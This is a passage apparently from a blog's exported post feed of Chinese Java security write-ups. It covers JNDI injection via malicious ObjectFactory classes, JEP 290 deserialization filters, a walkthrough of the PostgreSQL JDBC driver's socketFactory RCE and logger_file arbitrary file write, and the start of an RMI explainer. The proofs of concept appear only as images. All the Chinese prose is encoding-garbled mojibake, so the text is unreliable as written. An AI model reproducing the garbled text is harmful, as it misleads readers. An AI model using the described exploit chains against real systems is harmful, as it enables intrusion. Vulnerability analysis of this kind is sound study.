ï¼Œå¦åˆ™æ˜¯ä¸å¯èƒ½è°ƒç”¨æˆåŠŸçš„ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2ad184a640746724ee37cfee2f712d44.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ–¹æ³•ä½“æœ€ç»ˆä¼šè°ƒç”¨NamingManager#getObjecInstanceæ–¹æ³•ï¼Œä¼ å…¥æˆ‘ä»¬çš„Referenceå¯¹è±¡ä¸name</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9632a133680faef2d9e3996b90079db5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¯¥æ–¹æ³•ä¸­é‡ç‚¹åœ¨ç¬¬330è¡Œä¸332è¡Œï¼Œåœ¨330è¡Œè°ƒç”¨getObjectFactoryFromReferenceé—¯å…¥Referenceå¯¹è±¡ä¸fï¼Œfå°±æ˜¯æˆ‘ä»¬çš„æ¶æ„ç±»çš„å…¨ç±»åï¼Œè¯¥æ–¹æ³•ä¸­æˆ–å®ä¾‹åŒ–æˆ‘ä»¬çš„æ¶æ„ç±»ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d3cecb586e66ba61b934f8750f559d30.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¦–å…ˆæ˜¯åœ¨ç¬¬148è¡Œè·å–äº†æˆ‘ä»¬æ¶æ„ç±»çš„Classå¯¹è±¡ï¼Œç„¶åé€šè¿‡åå°„çš„æ–¹å¼å¯¹è¯¥ç±»è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ¶æ„ç±»çš„æ¶æ„ä»£ç å¯ä»¥å†™åœ¨é™æ€ä»£ç å—ã€å®ä¾‹ä»£ç å—ã€æ— å‚æ„é€ æ–¹æ³•ä¸­ã€‚ç†Ÿæ‚‰javaç±»åŠ è½½æœºåˆ¶çš„éƒ½æ¸…æ¥šï¼Œjavaçš„ç±»å¤¹æ‚æ ¸å¿ƒæ–¹æ³•ä¸ºloadClassã€defineClassã€findClassï¼Œè¿™å·²ç»å¾ˆæ˜æ˜¾äº†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0e380d2e8ab633810450f2c701af429e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/9b8b0f55bc77487f1ae605af4c268efe.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>getObjectFactoryFromReferenceæ–¹æ³•æ‰§è¡Œå®Œæˆåä¼šè·å¾—æˆ‘ä»¬è‡ªå®šä¹‰çš„ObjectFactoryå¯¹è±¡ï¼Œè®©åè°ƒç”¨è¯¥å¯¹è±¡çš„getObjectInstanceæ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬çš„æ¶æ„ä»£ç å¯ä»¥å†™åœ¨è¯¥æ–¹æ³•ä¸­çš„åŸå› ã€‚<br>æ‰€ä»¥ä½ æ³¨æ„åˆ°äº†å—ï¼Œè¿™ç§æ–¹å¼æ˜¯ä¸èƒ½ç»•è¿‡é«˜ç‰ˆæœ¬JDKçš„trustURLCodebaseæœºåˆ¶çš„ï¼Œæ‰€ä»¥æœ‰å±€é™ï¼Œé‚£ä¹ˆè¦å¦‚ä½•åœ¨é«˜ç‰ˆæœ¬JDKä½¿ç”¨è¿™ç§æ–¹å¼æ³¨å…¥å‘¢ï¼Œç›¸æ¯”ä½ å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘ä»¬ä¹‹æ‰€ä»¥éœ€è¦ä½¿ç”¨CodeBaseæ˜¯å› ä¸ºæˆ‘ä»¬è¦åŠ è½½çš„è¿œç¨‹ç±»åœ¨æœ¬åœ°ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå¦‚æœåœ¨å®¢æˆ·ç«¯æµ‹å­˜åœ¨æˆ‘ä»¬è¦ä½¿ç”¨çš„æ¶æ„ç±»ä¸å°±å®Œç¾çš„é¿å…äº†CodeBaseçš„ä¿æŠ¤æœºåˆ¶äº†å—ï¼Ÿæ‰€ä»¥æˆ‘ä»¬ä¸‹ä¸€ç« å°±å»æ‰¾ä¸€æ‰¾è¿™ä¸ªtomcatæˆ–è€…JDKæœ¬åœ°çš„å±é™©Gadget</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>JEP 290 åˆè¯†</title>
    <url>/archives/fe14a293.html</url>
    <content><![CDATA[<p>JEP 290æ˜¯ oracleæä¾›å·²ä¸€å¥—JAVAååºåˆ—åŒ–æœºåˆ¶ï¼Œå…¶å¹¶ä¸æ˜¯ä¸€ç§å¿…é¡»è¢«å¼ºåˆ¶æ‰§è¡Œçš„ç­–ç•¥ï¼Œè€Œæ˜¯éœ€è¦ç¨‹åºå‘˜æˆ–è€…è¿ç»´äººå‘˜è¿›è¡Œå¼€å‘ä¸å¯ç”¨ã€‚å…³äºè¯¥æœºåˆ¶çš„ä¼˜ç¼ºç‚¹å€Ÿç”¨è€å¤–çš„ä¸€ç¯‡æ–‡ç« </p>
<span id="more"></span>
<blockquote>
<p><a href="https://dzone.com/articles/a-first-look-into-javas-new-serialization-filterin">https://dzone.com/articles/a-first-look-into-javas-new-serialization-filterin</a></p>
</blockquote>
<p>ä¸­æ–‡ç‰ˆå¯ä»¥å‚è€ƒ</p>
<blockquote>
<p><a href="https://blog.csdn.net/caiqiiqi/article/details/104270776">https://blog.csdn.net/caiqiiqi/article/details/104270776</a></p>
</blockquote>
<p>è¯¥æœºåˆ¶æä¾›äº†ä¸‰ç§é˜²å¾¡ç­–ç•¥ï¼Œåˆ†åˆ«æ˜¯å…¨å±€è¿‡æ»¤å™¨ã€è‡ªå®šä¹‰è¿‡æ»¤å™¨ä»¥åŠå†…ç½®è¿‡æ»¤å™¨</p>
<h1 id="å…¨å±€è¿‡æ»¤å™¨"><a href="#å…¨å±€è¿‡æ»¤å™¨" class="headerlink" title="å…¨å±€è¿‡æ»¤å™¨"></a>å…¨å±€è¿‡æ»¤å™¨</h1><p>è¯¥è¿‡æ»¤å™¨å¯ä»¥é€šè¿‡ä¸‰ç§æ–¹æ³•è¿›è¡Œå¯ç”¨ï¼Œ</p>
<ol>
<li>å¯åŠ¨åº”ç”¨æ—¶é€šè¿‡æŒ‡å®šå‚æ•°<code>-Djdk.serialFilter=&lt;ç™½åå•ç±»1&gt;;&lt;ç™½åå•ç±»2&gt;;!&lt;é»‘åå•ç±»&gt;</code></li>
<li>è®¾ç½®ç¯å¢ƒå˜é‡<code>$JAVA_HOME/jre/lib/security/java.security</code></li>
<li>å¯åŠ¨æ—¶æŒ‡å®šç­–ç•¥æ–‡ä»¶<code>-Djava.security.properties=&lt;é»‘ç™½åå•é…ç½®æ–‡ä»¶å&gt;</code><br>å…³äºjava.securityæ–‡ä»¶æä¾›äº†ä¸»è¦æä¾›äº†ä¸¤ç§ç­–ç•¥ï¼Œä¸€ç§æ˜¯é™åˆ¶ç±»è°ƒç”¨çš„æ·±åº¦ä¸æ•°é‡ï¼ŒäºŒæ˜¯é€šè¿‡é»‘ç™½åå•è¿›è¡Œé™åˆ¶<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0e3f3f807e34ba0d1132c7dd37ffd14f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li>
</ol>
<h1 id="è‡ªå®šä¹‰è¿‡æ»¤å™¨"><a href="#è‡ªå®šä¹‰è¿‡æ»¤å™¨" class="headerlink" title="è‡ªå®šä¹‰è¿‡æ»¤å™¨"></a>è‡ªå®šä¹‰è¿‡æ»¤å™¨</h1><p>ç¨‹åºå‘˜å¯åœ¨ç¼–ç æ˜¯ä½¿ç”¨<code>ObjectInputStreamFilter</code>æŒ‡å®šååºåˆ—åŒ–é»‘ç™½åå•<br><code>ObjectInputFilter filesOnlyFilter = ObjectInputFilter.Config.createFilter(&quot;de.mogwailabs.Example;!*&quot;);</code></p>
<h1 id="å†…ç½®è¿‡æ»¤å™¨"><a href="#å†…ç½®è¿‡æ»¤å™¨" class="headerlink" title="å†…ç½®è¿‡æ»¤å™¨"></a>å†…ç½®è¿‡æ»¤å™¨</h1><p>å…¶å®ç¬¬ä¸€å¼ å›¾é‡Œé¢å°±æ˜¯ä¸€äº›å†…ç½®è¿‡æ»¤å™¨ï¼Œå½“ç„¶æˆªå›¾ä¸å…¨ï¼Œå¦‚æœè¦å¯åŠ¨å»æ‰æ³¨é‡Šå³å¯</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>JEP 290</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL JDBC Driver RCE&amp;ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</title>
    <url>/archives/dbd438c0.html</url>
    <content><![CDATA[<p>ä¸Šç­æ²¡æœ‰ä»»åŠ¡ä½ ä»¬éƒ½å¹²ä»€ä¹ˆï¼Œåæ­£æˆ‘æ˜¯ä¸ä¼šæ‘¸é±¼çš„ï¼Œè¿™è¾ˆå­éƒ½ä¸å¯èƒ½æ‘¸é±¼çš„ï¼Œå¤ç°è¿™ä¸ªæ¼æ´çš„åˆè¡·æ˜¯çœ‹äº†æŸå…¬ä¼—å·å…³äºVmware Workspace One Accessçš„jdbcæ³¨å…¥æ¼æ´ï¼Œæ–‡ä¸­å€¼åˆ†æåˆ°jdbc urlå¯æ§çš„éƒ¨åˆ†ï¼Œä½†æ˜¯æˆ‘ä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆjdbcå¯æ§å°±ä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œäºæ˜¯ä¸Šç½‘æœäº†jdbcæ³¨å…¥çš„æ–‡ç« ï¼Œäºæ˜¯æ‰¾åˆ°äº†è¿™å„¿ï¼š</p>
<span id="more"></span>
<blockquote>
<p><a href="https://paper.seebug.org/1832/">https://paper.seebug.org/1832/</a></p>
</blockquote>
<p>è¿™ç¯‡æ–‡ç« é‡Œä»‹ç»äº†Mysql çš„JDBCé©±åŠ¨å¯èƒ½å¯¼è‡´çš„æ¼æ´çš„åˆ†æï¼Œä¸è¿‡è¿™å¥½åƒä¸æ˜¯æˆ‘éœ€è¦çš„ï¼Œä¸è¿‡æˆ‘è¿˜æ˜¯å­¦ä¹ äº†ä¸€æ³¢ï¼Œå…·ä½“çš„è°ƒç”¨æµç¨‹æˆ‘è¿˜æ²¡æœ‰çœ‹ï¼Œå‡†å¤‡å’‹å†™å®Œè¿™ç¯‡å°±å»çœ‹çœ‹ã€‚åæ¥æˆ‘åˆåœ¨åˆšæ‰æåˆ°çš„å…¬ä¼—å·é‡Œæ‰¾åˆ°äº†å¦ä¸€ç¯‡å°†PostGreSQLçš„æ³¨å…¥åˆ†æï¼Œäºæ˜¯æˆ‘å°±è·Ÿç€åˆ†æäº†ä¸€æ³¢ã€‚è¿™ç¯‡æ–‡ç« é‡Œä»‹ç»äº†ä¸¤ä¸ªæ¼æ´ä¸€ä¸ªæ˜¯RCEï¼Œå¦ä¸€ä¸ªæ˜¯ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ã€‚</p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>é¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªMAVENé¡¹ç›®ï¼Œç„¶åå¼•å…¥ç›¸å…³çš„ä¾èµ–ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5ced078929b993db8057524c1e367ab0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åç¼–å†™ä¸€ä¸ªæ¼æ´åˆ©ç”¨POCã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/32449109031c3fc2a331e246a6cacf49.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾ˆæ˜æ˜¾å¯¼è‡´æ¼æ´çš„æ˜¯jdbcURLçš„socketFactoryä¸socketFactoryArgè¿™ä¸¤ä¸ªå‚æ•°ï¼Œåœ¨jdbcURLçš„å®šä¹‰ä¸­ï¼Œå‚æ•°éƒ¨åˆ†ä¸€èˆ¬è¢«ç§°ä½œæ‰©å±•å‚æ•°ï¼Œå…¶æ€»ç”¨æ˜¯æŒ‡å®šè¿æ¥æ•°æ®åº“çš„ä¸€äº›ç‰¹æ€§ã€‚å¤§èƒ†cancelå¯¼è‡´æ¼æ´çš„å°±æ˜¯è¿™ä¸¤ä¸ªå‚æ•°ï¼Œè€Œè¿™ä¸ªæ¼æ´çš„kick-offå°±æ˜¯DriverManager.getConnectionè¿™ä¸ªç±»æ–¹æ³•ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯ä¸æ–­è·Ÿè¸ªè¿™ä¸ªå‡½æ•°çš„Chainæœ€ç»ˆæ‰¾åˆ°sinkç‚¹ã€‚ç›´æ¥å¼€å¹²ï¼Œæ¯«æ— ç–‘é—®æˆ‘ä»¬è¦ä½¿ç”¨è°ƒè¯•æ¨¡å¼å°†ä»£ç è·‘èµ·æ¥ï¼Œç„¶åé”®å…¥åˆ°getConnectionå‡½æ•°é‡Œé¢ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/064c6d4ca7a7331a6e695e5d01c6a6d2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ— æ„ä¹‰çš„éƒ¨åˆ†æˆ‘å°±ç›´æ¥æ”¾å›¾ç‰‡äº†ï¼Œéœ€è¦å…³æ³¨çš„åœ°æ–¹æˆ‘ä¼šè¯´æ˜<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7392fcc25dc3f316af36782dc20f0293.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/ccbaeb08422697f7a4fb4670f23057dd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæ³¨æ„æ³¨æ„ç¬¬151è¡Œ</p>
<blockquote>
<p>this.setupLoggerFromProperties(props);</p>
</blockquote>
<p>è¿™ä¸æˆ‘ä»¬çš„ä»»æ„æ–‡ä»¶å†™å…¥æœ‰å…³ï¼Œå½“ç„¶ç°åœ¨æˆ‘ä»¬ä¸å…³æ³¨ä»–ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹propsçš„å€¼<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ab3aaf9cdbd7f4e7a764c52c68ff5b62.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å­˜å‚¨çš„éƒ½æ˜¯jdbcRULå«æœ‰çš„ä¸€äº›å…³é”®ä¿¡æ¯ï¼Œå…·ä½“çš„å®ç°æ­¥éª¤æˆ‘å½“ç„¶æ˜¯ä¸€æ­¥ä¸€æ­¥çœ‹äº†çš„ï¼Œæœ‰æ–°åŒºçš„å¯ä»¥è‡ªå·±çœ‹çœ‹ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d9714883310a8c2d83f1b6538fcdf8b6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9c41a90e6a0b2680b1ba52b62aa8cff6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œå¯¹propsè¿›è¡Œäº†å¤„ç†ï¼Œæœ€ç»ˆç”Ÿæˆçš„æ˜¯ä¸€ä¸ªhostSpecsç±»å‹çš„æ•°ç»„ï¼ŒhostSpecså¯¹è±¡å­˜å‚¨äº†æ•°æ®åº“è¿æ¥çš„hostnae, portä»¥åŠä¸€ä¸ªæ‰©å±•å‚æ•°localSocketAddressï¼Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8e662319025a149bd51fcb4a54792ca8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/371c3ab18de2f8e22781466536dc56e4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/dd9ed18eb4931c726f21b622b0886322.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ac4cbac510fe44fe69ab979e601d56d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹ä¸€æ³¢è¿™ä¸ªinfoå­˜å‚¨çš„ä¿¡æ¯äº†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/403ae02a564320dedc0f27f2c54d2a05.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/df2ae255020b698ba90dea5bf60ce140.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæ³¨æ„ç¬¬ä¸‰ä¸ªå‚æ•°<code>PGProperty.SOCKET_FACTORY_ARG</code>ï¼ŒPGPropertyæ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹ï¼Œå…¶å†…éƒ¨å®šä¹‰äº†getæ–¹æ³•ï¼Œå®ç°çš„åŠŸèƒ½æ˜¯å¯¹åˆ¤æ–­æšä¸¾é¡¹çš„å€¼æœ‰æ²¡æœ‰åœ¨ä¼ å…¥çš„propertiesä¸­ï¼Œå¦‚æœåœ¨åˆ™æŸ¥æ‰¾è¿”å›ï¼Œå¦‚æœä¸åœ¨åˆ™è¿”å›é»˜è®¤å€¼ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7ce33e988bcb94a35fd158b484e500f9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1a4f33fffdfd9632bb4a02a46150e3ae.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šçš„æšä¸¾é¡¹ï¼Œè¿™äº›å†…å®¹å¾ˆå¤§ä¸€éƒ¨åˆ†éƒ½æ˜¯JDBCçš„æ‰©å±•å‚æ•°çš„å¯é€‰å€¼ã€‚<br>åœ¨æˆ‘ä»¬çš„ä»£ç ä¸­è¿™ä¸ªå€¼å°±æ˜¯<code>args</code>ä¹Ÿå°±æ˜¯æˆ‘ä»¬æœ€å¼€å§‹pocè®¾ç½®çš„å‚æ•°<code>socketFactoryArg</code><br>è¿˜å¯ä»¥çœ‹ä¸€çœ‹ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼<br><img src="https://i-blog.csdnimg.cn/blog_migrate/56340d55a62456873cb62038ab7c52f3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°±æ˜¯æœ€å¼€å§‹è®¾ç½®çš„å‚æ•°<code>socketFactoryClass</code><br>ç„¶åè·Ÿè¿›è¿™ä¸ªå‡½æ•°<code>instantiate</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/90be4014a268634cde7e700a2425fda1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾ˆæ˜æ˜¾çš„åå°„è°ƒç”¨ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºç±»åï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä½œä¸ºæ„é€ æ–¹æ³•çš„å‚æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°<code>ObjectFactory.instantiate</code>å°±æ˜¯æˆ‘ä»¬çš„sinkç‚¹äº†ã€‚<br>ç°åœ¨æˆ‘ä»¬è¦æ‰¾åˆ°ä¸€ä¸ªgadgetèƒ½å¤Ÿåœ¨åœ¨ç±»å®ä¾‹åŒ–çš„è¿‡ç¨‹ä¸­å®ç°RCEï¼Œä½œè€…æ ¹æ®jacksonçš„å†å²æ¼æ´<code>CVE-2017-17485</code>æ‰¾åˆ°è¿™ä¹ˆä¸€ä¸ªç±»<br><code>org.springframework.context.support.ClassPathXmlApplicationContext</code> è¯¥ç±»åœ¨å®ä¾‹åŒ–çš„æ—¶å€™ä¼šä¸‹è½½å‡ºå…¥çš„å‚æ•°æŒ‡å®šçš„xmlæ–‡ä»¶ç„¶åè·å–java beanï¼Œç„¶åé€šè¿‡jpelè¡¨è¾¾å¼æ‰§è¡Œæ¶æ„ä»£ç ã€‚<br>å®Œæ•´çš„pocé•¿è¿™æ ·<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2281dffccbdcbb3e7ef26beb6c41b4d6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å½“ç„¶è¿‡å»jdbcè¿æ¥çš„ç”¨æˆ·åæ ¹æœ¬ä¸ç”¨å¡«ï¼Œæ ¹æœ¬ç”¨ä¸ä¸Šã€‚<br>xmlæ–‡ä»¶é•¿è¿™æ ·ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d32339c5218d29b8d0b34a29ee52d131.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åç›´æ¥è¿è¡Œä»£ç <br><img src="https://i-blog.csdnimg.cn/blog_migrate/f5ff4c93c580108a6d0240e6a85db852.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å®Œç¾</p>
<h1 id="ä»»æ„æ–‡ä»¶å†™"><a href="#ä»»æ„æ–‡ä»¶å†™" class="headerlink" title="ä»»æ„æ–‡ä»¶å†™"></a>ä»»æ„æ–‡ä»¶å†™</h1><p>è¿™ä¸ªä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä¸Šé¢æœ‰æåˆ°è¿‡ï¼Œé‡ç‚¹åœ¨<code>this.setupLoggerFromProperties(props);</code>é‡Œé¢è®¾ç½®äº†æ—¥å¿—å¤„ç†å™¨ï¼Œåœ¨è°ƒç”¨è¯¥loggerçš„æ—¶å€™å°±ä¼šä½¿ç”¨è¯¥å¤„ç†å™¨å°†æ—¥å¿—è®°å½•åˆ°æŒ‡å®šçš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2163e134a61bb522243e3e445f0eeca2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæ³¨æ„è¦è®¾ç½®jdbcæ‰©å±•å‚æ•°<code>logger_level</code>è®¾ç½®æ—¥å¿—è®°å½•çš„çº§åˆ«ï¼Œå½“ç„¶ä¸èƒ½ä¸ºoffï¼Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/829303d5d04f95aadbb7c8cb22f66df3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¾ç½®æ‰©å±•å‚æ•°<code>logger_file</code>æŒ‡å®šæ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ï¼Œè¿™é‡Œæ²¡æœ‰å¯¹è·¯å¾„è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œå°†æ–‡ä»¶æŒ‡å®šåˆ°æƒ³è¦çš„ä½ç½®ã€‚</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/763faa16a6ecaf5bf292864d963eb372.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ªæ–‡ä»¶å¤„ç†å™¨æœ€ç»ˆè¢«æ·»åŠ åˆ°äº†<code>Parent_LOGGER</code>è¿™ä¸ªæ—¥å¿—è®°å½•å™¨ä¸­<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a9a2b6ea66b5222132b9b34ef86ba49e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨æ‰§è¡Œå®Œ<code>setupLoggerFromProperties(props)</code>åï¼Œé©¬ä¸Šå°±æœ‰è®°å½•æ—¥å¿—çš„æ“ä½œï¼Œè¯¥æ“ä½œå°†æ•´ä¸ªjdbcUrlè®°å½•åˆ°æ—¥å¿—ä¸­ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/10dcb0eb1dd3852c53c60fd860fbd202.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨æ„åˆ°è¿™é‡Œçš„æ—¥å¿—è®°å½•å™¨å¹¶ä¸æ˜¯<code>PARENT_LOGGER</code>è€Œæ˜¯<code>LOGGER</code>ï¼Œé‚£ä¹ˆä»–æ˜¯æ€ä¹ˆè°ƒç”¨åˆ°çˆ¶è®°å½•å™¨çš„å‘¢ï¼Œè¿™ä¸ªå¯ä»¥è‡ªå·±è·Ÿä¸€ä¸‹logçš„æµç¨‹çœ‹ä¸€ä¸‹æ€ä¹ˆè·å–çš„ï¼Œæœ€ç»ˆçš„pocä¸æ•ˆæœ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1f0bd72347a1eb74e185be6a2a08c8f9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>ä»»æ„æ–‡ä»¶å†™</tag>
        <tag>Postgre</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>RMIåŸç†æµ…æ</title>
    <url>/archives/1298d583.html</url>
    <content><![CDATA[<p>@<a href="RMI%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90">TOC</a><br>å‰æ®µæ—¶é—´ä¸æ˜¯çˆ†äº†ä¸ªlog4jçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å—ï¼è¶æœºæˆ‘å°±äº†è§£äº†ä¸€ä¸‹ä»€ä¹ˆäº‹jndiï¼Œç„¶åå°±æ¥è§¦åˆ°äº†ldapä¸rmiï¼Œæ‰€æœ‰å‡†å¤‡å¥½å¥½å­¦ä¹ ä¸€ç•ªâ€¦â€¦</p>
<p>ä»¥ä¸Šå†…å®¹çº¯å±çç¼–ï¼Œå¦‚æœ‰é›·åŒï¼Œç»å¯¹æ˜¯å·§åˆã€‚</p>
<p>å…¶å®å¾ˆä¹…ä»¥å‰å°±äº†è§£è¿‡jndiï¼Œä½†é‚£æ—¶å€™æ„Ÿè§‰ç§¯ç´¯ä¸å¤Ÿæ·±ï¼Œæ‰€æœ‰ä¸€ç›´å¯¹ä»–çš„åŸç†æ²¡æœ‰ææ¸…æ¥šï¼Œçœ‹çš„å„ç§æ–‡ç« ä¹Ÿæ˜¯äº‘é‡Œé›¾é‡Œçš„ï¼Œç›´åˆ°æœ€è¿‘åœ¨åå¤ç ”ç£¨äº†ç½‘ç»œä¸Šçš„æ–‡ç« ä¹‹åï¼Œç»ˆäºæœ‰äº†ä¸€ç‚¹ç‚¹å¿ƒå¾—ï¼Œç‰¹æ­¤åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p>
<span id="more"></span>
<p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://www.cnblogs.com/nice0e3/p/14280278.html">Javaå®‰å…¨ä¹‹RMIåè®®åˆ†æ</a><br><a href="https://blog.csdn.net/he_and/article/details/105532007?spm=1001.2014.3001.5501">ã€å…¥å‘JAVAå®‰å…¨ã€‘RMIåŸºç¡€çœ‹è¿™ä¸€ç¯‡å°±è¶³å¤Ÿäº†</a></p>
<p>RMIï¼Œé¡¾åæ€ä¹‰ï¼Œè¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚å°±æ˜¯é€šè¿‡ç½‘ç»œè°ƒç”¨è¿œç¨‹çš„å¯¹è±¡æ–¹æ³•å®ç°ç‰¹å®šåŠŸèƒ½çš„ä¸€ç§åè®®ï¼Œjavaä¸­RMIåè®®çš„å®ç°ä¾èµ–äºjavaçš„ååºåˆ—åŒ–æœºåˆ¶ä»¥åŠJRMPåè®®æˆ–è€…IIOPåè®®ï¼Œè‡³äºè¿™ä¸¤ç§åè®®æ˜¯ä»€ä¹ˆï¼Œæš‚æ—¶è¿˜æ²¡æœ‰ç ”ç©¶ï¼Œä»¥åæœ‰æœºä¼šäº†å†ç ”ç©¶ç ”ç©¶ã€‚<br>è¿™é‡Œå…ˆç”©å‡ºæ¥RMIçš„é€šä¿¡æ¨¡å‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8b70ec8c0be1edfe10c5c3e2c928721c.png" 